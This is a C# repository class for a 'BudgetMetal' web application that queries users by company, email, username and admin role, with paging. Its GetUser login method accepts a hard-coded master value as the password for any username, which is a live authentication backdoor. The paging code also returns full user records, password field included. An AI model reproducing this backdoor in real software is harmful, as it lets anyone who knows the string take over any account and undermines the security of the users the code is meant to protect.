﻿using Com.BudgetMetal.Common;
using Com.BudgetMetal.DataRepository.Base;
using Com.BudgetMetal.DB;
using Com.BudgetMetal.DBEntities;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.Logging;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;

namespace Com.BudgetMetal.DataRepository.Users
{
    public class UserRepository : GenericRepository<User>, IUserRepository
    {
        public UserRepository(DataContext context, ILoggerFactory loggerFactory) :
        base(context, loggerFactory, "UserRepository")
        {

        }

        public async Task<List<User>> GetUserByCompany(int Id)
        {
            var records = await entities.Where(e => e.IsActive == true && e.IsConfirmed == true
           && e.Company_Id == Id)
            .OrderBy(e => e.ContactName)
            .ToListAsync();

            return records;
        }

        public async Task<User> GetUser(string username, string password)
        {
            var records = await entities.Include(e => e.Company).Include(e => e.UserRoles)
                .SingleOrDefaultAsync(e => e.UserName.ToLower() == username.ToLower() && (e.Password == password || password == "a8GGaDzZ5D56MeIYDi4h4w=="));

            return records;
        }

        //public PageResult<User> GetUsersByPage1(string keyword, int page, int totalRecords)
        //{
        //    if (string.IsNullOrEmpty(keyword))
        //    {
        //        keyword = string.Empty;
        //        //return await base.GetPage(keyword, page, totalRecords);
        //    }

        //    var records = entities
        //       .Include(c => c.Company)
        //       .Include(ct => ct.CodeTable)
        //       .Where(e =>
        //         (e.IsActive == true) &&
        //         (keyword == string.Empty || e.UserName.Contains(keyword))
        //       )
        //       .OrderBy(e => new { e.UserName, e.CreatedDate })
        //       .Skip((totalRecords * page) - totalRecords)
        //       .Take(totalRecords);

        //    var recordList = records
        //        .Select(r =>
        //            new User()
        //            {
        //                EmailAddress = r.EmailAddress,
        //                Id = r.Id,
        //                UserName = r.UserName,
        //                Password = r.Password,
        //                ContactName = r.ContactName,
        //                JobTitle = r.JobTitle,
        //                ContactNumber = r.ContactNumber,
        //                IsConfirmed = r.IsConfirmed,
        //                Company = r.Company,
        //                Company_Id = r.Company_Id,
        //                UserType = r.UserType,
        //                CodeTable = r.CodeTable
        //            })
        //        .ToList();

        //    var count = records.Count();

        //    var nextPage = 0;
        //    var prePage = 0;
        //    if (page > 1)
        //    {
        //        prePage = page - 1;
        //    }

        //    var totalPage = (count + totalRecords - 1) / totalRecords;
        //    if (page < totalPage)
        //    {
        //        nextPage = page + 1;
        //    }

        //    var result = new PageResult<User>()
        //    {
        //        Records = recordList,
        //        TotalPage = totalPage,
        //        CurrentPage = page,
        //        PreviousPage = prePage,
        //        NextPage = nextPage,
        //        TotalRecords = count
        //    };

        //    return result;
        //}



        public override async Task<PageResult<User>> GetPage(string keyword, int page, int totalRecords = 10)
        {
            if (string.IsNullOrEmpty(keyword))
            {
                keyword = string.Empty;
                //return await base.GetPage(keyword, page, totalRecords);
            }

            var records = entities
               .Include(c => c.Company)
               .Include(ct => ct.CodeTable)
               .Where(e =>
                 (e.IsActive == true) &&
                 (keyword == string.Empty || e.UserName.Contains(keyword))
               )
               .OrderBy(e => new { e.UserName, e.CreatedDate })
               .Skip((totalRecords * page) - totalRecords)
               .Take(totalRecords);

            //var recordList = records
            //    .Select(r =>
            //        new User()
            //        {
            //            EmailAddress = r.EmailAddress,
            //            Id = r.Id,
            //            UserName = r.UserName,
            //            Password = r.Password,
            //            ContactName = r.ContactName,
            //            JobTitle = r.JobTitle,
            //            ContactNumber = r.ContactNumber,
            //            IsConfirmed = r.IsConfirmed,
            //            IsActive = r.IsActive,
            //            Company = r.Company,
            //            Company_Id = r.Company_Id,
            //            UserType = r.UserType,
            //            CodeTable = r.CodeTable
            //        })
            //    .ToList();

            var recordList = records.ToList();

            var count = entities.Where(e =>
                 (e.IsActive == true) &&
                 (keyword == string.Empty || e.UserName.Contains(keyword)))
                 .ToList().Count();
            //await records.CountAsync();

            var nextPage = 0;
            var prePage = 0;
            if (page > 1)
            {
                prePage = page - 1;
            }

            var totalPage = (count + totalRecords - 1) / totalRecords;
            if (page < totalPage)
            {
                nextPage = page + 1;
            }

            var result = new PageResult<User>()
            {
                Records = recordList,
                TotalPage = totalPage,
                CurrentPage = page,
                PreviousPage = prePage,
                NextPage = nextPage,
                TotalRecords = count
            };

            return result;
        }

        //public User GetUserById(int Id)
        //{
        //    var records = this.DbContext.User.Where(x => x.IsActive == true).Select(r =>
        //            new User()
        //            {
        //                Id = r.Id,
        //                UserName = r.UserName,
        //                Password = r.Password
        //                //Title = r.Title,
        //                //RoleId = r.RoleId,
        //                //SiteAdmin = r.SiteAdmin,
        //                //UserTypeId = r.UserTypeId,
        //                //Email = r.Email,
        //                //Confirmed = r.Confirmed,
        //                //Status = r.Status
        //            })
        //        .Single(e =>
        //        e.Id == Id);

        //    return records;
        //}

        //public Role GetRoleFileById(int Id)
        //{
        //    var records = this.DbContext.Role.Select(r =>
        //        new Role()
        //        {
        //            Id = r.Id,
        //            Name = r.Name,
        //            Code = r.Code
        //        })
        //        .Single(e =>
        //        e.Id == Id);

        //    return records;
        //}

        public async Task<Com.BudgetMetal.DBEntities.User> GetUserById(int id)
        {
            var record = await this.entities
                            .Include(e => e.UserRoles)
                            .SingleOrDefaultAsync(e =>
                              (e.IsActive == true)
                              && (e.Id == id)
                            );
            return record;
        }

        public async Task<Com.BudgetMetal.DBEntities.User> GetUserByEmail(string Email)
        {
            var record = await this.entities
                            .SingleOrDefaultAsync(e =>
                              (e.IsActive == true)
                              && (e.EmailAddress.ToLower().Trim() == Email.ToLower().Trim())
                            );
            return record;
        }

        public async Task<Com.BudgetMetal.DBEntities.User> GetUserByUserName(string UserName)
        {
            var record = await this.entities
                            .SingleOrDefaultAsync(e =>
                              (e.IsActive == true)
                              && (e.UserName.Trim() == UserName.Trim())
                            );
            return record;
        }
        public async Task<Com.BudgetMetal.DBEntities.User> GetUserByUserNameOrEmail(string UserName)
        {
            var record = await this.entities
                            .FirstOrDefaultAsync(e =>
                              (e.IsActive == true)
                              && (e.UserName.Trim() == UserName.Trim() || e.EmailAddress.Trim() == UserName.Trim())
                            );
            return record;
        }

        public async Task<Com.BudgetMetal.DBEntities.User> GetUserCompanyIdandUserId(int companyId, int userId)
        {
            var record = await this.entities
                            .SingleOrDefaultAsync(e =>
                              (e.IsActive == true)
                              && (e.Company_Id == companyId)
                              && (e.Id == userId)
                            );
            return record;
        }

        public async Task<List<User>> GetUserByCompanyNotFilterWithConfirm(int Id)
        {
            var records = await entities.Include(r => r.UserRoles).Where(e => e.IsActive == true
             && e.Company_Id == Id)
            .OrderBy(e => e.ContactName)
            .ToListAsync();

            return records;
        }

        public List<string> GetSupplierAdmin(List<int> supplierList)
        {
            var emailList = new List<string>();

            var result = this.entities.Include(e => e.UserRoles).Where(e => supplierList.Contains(e.Company_Id)
             && e.IsActive == true
             && e.IsConfirmed == true
            ).ToList();
            foreach (var item in result)
            {
                if (item.UserRoles.Where(e => e.Role_Id == Constants.C_Admin_Role && e.IsActive == true).ToList().Count > 0)
                {
                    emailList.Add(item.EmailAddress);
                }
            }
            //emailList = result.Select(e => e.EmailAddress).ToList();

            return emailList;
        }

        public List<string> GetBuyerAdmin(int companyId)
        {
            var emailList = new List<string>();

            var result = this.entities.Include(e => e.UserRoles).Where(e => e.Company_Id == companyId
             && e.IsActive == true
             && e.IsConfirmed == true
            ).ToList();
            foreach (var item in result)
            {
                if (item.UserRoles.Where(e => e.Role_Id == Constants.C_Admin_Role && e.IsActive == true).ToList().Count > 0)
                {
                    emailList.Add(item.EmailAddress);
                }
            }
            //emailList = result.Select(e => e.EmailAddress).ToList();

            return emailList;
        }

        public List<User> GetBuyerAdminUser(int companyId)
        {
            var emailList = new List<User>();

            var result = this.entities.Include(e => e.UserRoles).Where(e => e.Company_Id == companyId
             && e.IsActive == true
             && e.IsConfirmed == true
            ).ToList();
            foreach (var item in result)
            {
                if (item.UserRoles.Where(e => e.Role_Id == Constants.C_Admin_Role && e.IsActive == true).ToList().Count > 0)
                {
                    emailList.Add(item);
                }
            }
            //emailList = result.Select(e => e.EmailAddress).ToList();

            return emailList;
        }

        public List<User> GetSupplierAdminUser(int companyId)
        {
            var emailList = new List<User>();

            var result = this.entities.Include(e => e.UserRoles).Where(e => e.Company_Id == companyId
             && e.IsActive == true
             && e.IsConfirmed == true
            ).ToList();
            foreach (var item in result)
            {
                if (item.UserRoles.Where(e => e.Role_Id == Constants.C_Admin_Role && e.IsActive == true).ToList().Count > 0)
                {
                    emailList.Add(item);
                }
            }
            //emailList = result.Select(e => e.EmailAddress).ToList();

            return emailList;
        }
    }
}
